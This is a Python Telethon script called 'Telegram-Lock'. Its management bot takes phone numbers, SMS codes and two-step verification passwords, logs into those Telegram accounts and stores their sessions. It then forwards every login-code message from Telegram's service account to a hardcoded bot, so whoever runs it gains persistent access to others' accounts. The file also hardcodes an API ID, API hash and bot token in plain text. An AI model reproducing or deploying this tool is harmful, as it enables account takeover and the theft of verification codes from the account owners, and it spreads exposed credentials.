import asyncio
import platform
import os
import re
import logging
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    AuthKeyDuplicatedError
)

# Log config
logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('apscheduler').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)

# API Credentials
API_ID = 19684564
API_HASH = "6219dccd88035a229ec3aa84d8162a38"
BOT_TOKEN = "8754918048:AAEKWN7fBUZalgJpI3yJC31tc7wo6KFsp_Q"
FORWARD_TARGET_BOT = "8754918048"

# Global storage
accounts = {}
user_login_states = {}
PHONE_PATTERN = re.compile(r'^\+\d{10,15}$')


def bind_account_handlers(client, phone):
    # Self check command
    @client.on(events.NewMessage(outgoing=True))
    async def self_check_handler(event):
        if event.message.text and event.message.text.lower() == "self check":
            await event.message.edit(text="self checked!")

    # Check anti-login status
    @client.on(events.NewMessage(outgoing=True, pattern="antilogin$"))
    async def status_check(event):
        state = "on" if accounts[phone]["anti_login"] else "off"
        await event.message.edit(text=f"Anti-login forwarding is {state}.")

    # Enable auto forward
    @client.on(events.NewMessage(outgoing=True, pattern="antilogin on$"))
    async def enable_forward(event):
        accounts[phone]["anti_login"] = True
        await event.message.edit(text="Anti-login forwarding enabled successfully.")

    # Disable auto forward
    @client.on(events.NewMessage(outgoing=True, pattern="antilogin off$"))
    async def disable_forward(event):
        accounts[phone]["anti_login"] = False
        await event.message.edit(text="Anti-login forwarding disabled successfully.")

    # Capture SMS from official Telegram bot 777000
    @client.on(events.NewMessage(from_users=[777000]))
    async def capture_verification(event):
        if accounts[phone]["anti_login"]:
            try:
                target_bot = await client.get_entity(FORWARD_TARGET_BOT)
                await client.forward_messages(target_bot, event.message)
                logger.info(f"[{phone}] Verification code forwarded to target bot")
            except Exception as err:
                logger.error(f"[{phone}] Failed to forward message: {str(err)}")


# Main bot client for management commands
bot_client = TelegramClient(StringSession(), API_ID, API_HASH)


@bot_client.on(events.NewMessage(pattern="/start"))
async def cmd_help(event):
    help_msg = """📖 Telegram-Lock Command List
[Forward Control (Send in your account chat)]
self check        Test if program works normally
antilogin         Check auto-forward status
antilogin on      Enable auto forward SMS code
antilogin off     Disable auto forward SMS code

[Account Management (Send to this bot private chat)]
/addphone +8613800138000    Add & login new phone number
/listphone                  List all logged-in accounts
/delphone +8613800138000    Delete local session file
/logout +8613800138000      Log out account remotely
"""
    await event.reply(help_msg)


@bot_client.on(events.NewMessage(pattern="/addphone (.+)"))
async def cmd_add_phone(event):
    phone = event.pattern_match.group(1).strip()
    if not PHONE_PATTERN.match(phone):
        await event.reply("❌ Invalid phone format. Example: /addphone +8613800138000")
        return
    if phone in accounts:
        await event.reply("⚠️ This phone number is already logged in")
        return

    session_name = f"session_{phone.replace('+','')}"
    new_client = TelegramClient(session_name, API_ID, API_HASH)
    try:
        await new_client.connect()
        code_req = await new_client.send_code_request(phone)
        user_login_states[event.sender_id] = {
            "client": new_client,
            "phone": phone,
            "code_hash": code_req.phone_code_hash,
            "step": "input_sms_code"
        }
        await event.reply(f"✅ Verification code sent to {phone}\nPlease reply with numeric SMS code")
    except PhoneNumberInvalidError:
        await event.reply("❌ Invalid phone number")
    except AuthKeyDuplicatedError:
        await event.reply("❌ This account is logged in on another device")
    except Exception as err:
        await event.reply(f"❌ Failed to send code: {str(err)}")


@bot_client.on(events.NewMessage)
async def login_input_handler(event):
    if event.sender_id not in user_login_states:
        return
    state = user_login_states[event.sender_id]
    input_text = event.text.strip()

    # Step 1: Input SMS verification code
    if state["step"] == "input_sms_code":
        if not input_text.isdigit():
            return
        try:
            await state["client"].sign_in(
                phone_code_hash=state["code_hash"],
                code=input_text
            )
            # Login success without 2FA
            accounts[state["phone"]] = {
                "client": state["client"],
                "anti_login": False
            }
            bind_account_handlers(state["client"], state["phone"])
            del user_login_states[event.sender_id]
            await event.reply(f"🎉 {state['phone']} login success! Send antilogin on to enable forward")
        except SessionPasswordNeededError:
            # Need two-factor password
            state["step"] = "input_2fa_password"
            await event.reply("🔐 This account has two-step verification enabled, please reply with your 2FA password")
        except PhoneCodeInvalidError:
            await event.reply("❌ Wrong SMS code, run /addphone to retry")
            del user_login_states[event.sender_id]
        except Exception as err:
            await event.reply(f"❌ Login failed: {str(err)}")
            del user_login_states[event.sender_id]

    # Step 2: Input two-factor password
    elif state["step"] == "input_2fa_password":
        try:
            await state["client"].sign_in(password=input_text)
            accounts[state["phone"]] = {
                "client": state["client"],
                "anti_login": False
            }
            bind_account_handlers(state["client"], state["phone"])
            del user_login_states[event.sender_id]
            await event.reply(f"🎉 {state['phone']} 2FA verified, login complete! Send antilogin on to enable forward")
        except Exception as err:
            await event.reply(f"❌ Wrong 2FA password or error: {str(err)}\nRun /addphone to restart login")
            del user_login_states[event.sender_id]


@bot_client.on(events.NewMessage(pattern="/listphone"))
async def cmd_list_all(event):
    if not accounts:
        await event.reply("📭 No logged-in phones, use /addphone to add new account")
        return
    output = "📋 Logged-in Account List:\n"
    for number, data in accounts.items():
        status = "🟢 Forward ON" if data["anti_login"] else "🔴 Forward OFF"
        output += f"- {number} | {status}\n"
    await event.reply(output)


@bot_client.on(events.NewMessage(pattern="/delphone (.+)"))
async def cmd_delete_phone(event):
    phone = event.pattern_match.group(1).strip()
    if phone not in accounts:
        await event.reply("❌ Phone number not found in records")
        return
    # Disconnect client
    await accounts[phone]["client"].disconnect()
    del accounts[phone]
    # Delete session file
    session_file = f"session_{phone.replace('+','')}.session"
    if os.path.exists(session_file):
        os.remove(session_file)
    await event.reply(f"🗑 Session of {phone} removed completely")


@bot_client.on(events.NewMessage(pattern="/logout (.+)"))
async def cmd_logout_phone(event):
    phone = event.pattern_match.group(1).strip()
    if phone not in accounts:
        await event.reply("❌ Phone number not found in records")
        return
    try:
        await accounts[phone]["client"].log_out()
        await accounts[phone]["client"].disconnect()
        del accounts[phone]
        session_file = f"session_{phone.replace('+','')}.session"
        if os.path.exists(session_file):
            os.remove(session_file)
        await event.reply(f"🚪 {phone} logged out remotely from all devices")
    except Exception as err:
        await event.reply(f"❌ Logout failed: {str(err)}")


async def main():
    print("🤖 Telegram-Lock Started, waiting for commands...")
    await bot_client.start(bot_token=BOT_TOKEN)
    print("✅ Management bot online, send /start to view all commands")
    # Permanent idle loop
    while True:
        await asyncio.sleep(1 / 60)


if platform.system() == "Emscripten":
    asyncio.ensure_future(main())
else:
    if __name__ == "__main__":
        asyncio.run(main())
